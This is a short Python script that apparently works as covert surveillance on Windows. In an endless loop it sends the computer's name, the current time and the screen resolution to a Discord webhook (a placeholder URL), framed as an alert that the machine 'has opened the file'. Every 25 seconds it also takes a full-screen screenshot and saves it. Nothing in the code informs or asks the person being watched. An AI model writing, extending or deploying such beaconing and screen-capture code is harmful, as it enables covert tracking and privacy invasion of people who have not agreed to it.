import os
import time
from PIL import ImageGrab
from dhooks import Webhook

# Discord webhook setup
webhook_url = Webhook("WEBHOOK_HERE")

# Get the computer's name
computer_name = os.getenv('COMPUTERNAME')

# Counter for screenshots
screenshot_counter = 1

# Loop to send a message and take screenshots every 25 seconds
while True:
    # Get the current time
    current_time = time.strftime("%I:%M %p")  # Format time as 6:09 PM

    # Get the screen resolution (requires Windows-specific solution)
    import ctypes
    user32 = ctypes.windll.user32
    screen_width, screen_height = user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)
    resolution = f"{screen_width}x{screen_height}"

    # Create the message
    message = f"{computer_name} has opened the file at {current_time} with the resolution of {resolution}"

    # Send the message to Discord
    webhook_url.send(message)

    # Take a screenshot
    screenshot_path = f"screenshot{screenshot_counter}.png"
    screenshot = ImageGrab.grab()
    screenshot.save(screenshot_path)

    print(f"Sent message to Discord and saved screenshot locally: {screenshot_path}")

    # Increment the counter
    screenshot_counter += 1

    # Wait for 25 seconds before the next iteration
    time.sleep(25)
